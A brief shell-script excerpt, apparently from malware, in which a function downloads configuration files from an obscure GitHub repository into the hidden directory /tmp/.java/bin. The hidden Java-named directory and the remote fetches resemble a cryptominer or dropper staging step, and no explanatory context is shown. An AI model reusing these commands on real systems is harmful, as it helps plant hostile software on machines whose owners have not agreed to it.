...
function fetch_files() {
    ...
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/vn/cfg.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/vn/cnf.json -o conf.json
}
